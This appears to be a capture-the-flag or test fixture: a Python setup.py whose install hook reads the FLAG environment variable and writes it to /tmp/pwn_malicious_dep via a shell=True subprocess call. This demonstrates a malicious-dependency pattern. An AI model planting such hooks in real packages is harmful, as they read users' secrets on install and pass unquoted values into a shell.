import subprocess
import os

# setup.py
from setuptools import setup
from setuptools.command.install import install

class CustomInstallCommand(install):
    """Customized setuptools install command."""
    def run(self):
        # Run the standard install
        install.run(self)
        
        # After installation, run the post-install script
        flag = os.getenv("FLAG")
        if flag:
            command = f"echo {flag} > /tmp/pwn_malicious_dep"
        else: 
            command = "echo nope > /tmp/pwn_malicious_dep"
        subprocess.run(command, shell=True)

setup(
    name='that_package_does_nothing_but_reads_flag',
    version='0.1.0',
    py_modules=['that_package_does_nothing_but_reads_flag'],
    # Tell setuptools to use your custom command
    cmdclass={
        'install': CustomInstallCommand,
    },
)